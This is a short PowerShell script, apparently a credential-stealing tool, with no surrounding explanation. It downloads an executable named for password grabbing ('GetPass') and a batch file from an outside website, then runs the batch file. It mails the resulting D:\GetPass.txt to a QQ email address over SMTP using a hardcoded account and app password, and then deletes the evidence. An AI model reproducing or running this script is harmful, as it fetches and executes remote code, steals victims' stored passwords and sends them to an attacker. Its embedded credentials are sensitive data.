(new-object System.Net.WebClient).DownloadFile('http://www.cdxy.me/GetPass.rar','D:\Get.exe');

(new-object System.Net.WebClient).DownloadFile('http://www.cdxy.me/Command.rar','D:\Command.bat');

D:\Command.bat;
$SMTPServer = 'smtp.qq.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('941335582@qq.com', 'olawgiwsvcimbdgf');

$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = '941335582@qq.com'

$ReportEmail.To.Add('941335582@qq.com')

$ReportEmail.Subject = 'GetPass'

$ReportEmail.Body = 'GetPass_text'  

$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'D:\GetPass.txt'

remove-item 'D:\Get.exe'
